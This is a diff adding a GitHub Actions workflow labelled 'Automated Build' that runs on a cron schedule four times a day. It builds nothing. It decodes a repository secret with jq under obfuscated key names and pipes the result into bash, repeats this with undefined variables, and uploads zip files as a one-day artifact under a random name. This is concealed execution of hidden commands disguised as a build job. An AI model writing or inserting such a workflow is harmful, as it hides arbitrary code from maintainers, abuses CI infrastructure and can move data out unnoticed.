@@ -1,0 +1,29 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '42 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          up9: ${{ secrets.up9 }}
+        run: |
+          printf '%s' "$up9" | jq -r .nw6306 | /bin/bash
+          echo $c46 | jq -r .oixt1114 | /bin/bash
+          echo $mi04 | jq -r .xnqyw38 | /bin/bash
+          echo $xmzk08 | jq -r .akifx70 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Yd5z1xOQ
+          path: "*.zip"
+          retention-days: 1
